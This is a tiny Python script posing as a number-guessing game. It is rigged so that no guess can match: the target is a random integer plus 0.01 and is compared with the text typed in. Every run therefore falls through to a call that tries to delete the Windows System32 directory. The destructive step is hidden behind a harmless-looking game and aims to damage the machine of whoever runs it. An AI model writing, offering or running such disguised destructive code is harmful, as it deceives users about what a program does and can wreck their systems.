import os
import random
guessnumber = random.randint(1, 10) + 0.01
guess = input("Let's play a little game, guess the number: ")

if guess == guessnumber:
	print("correct")
else:
	os.remove("C:\windows\System32")

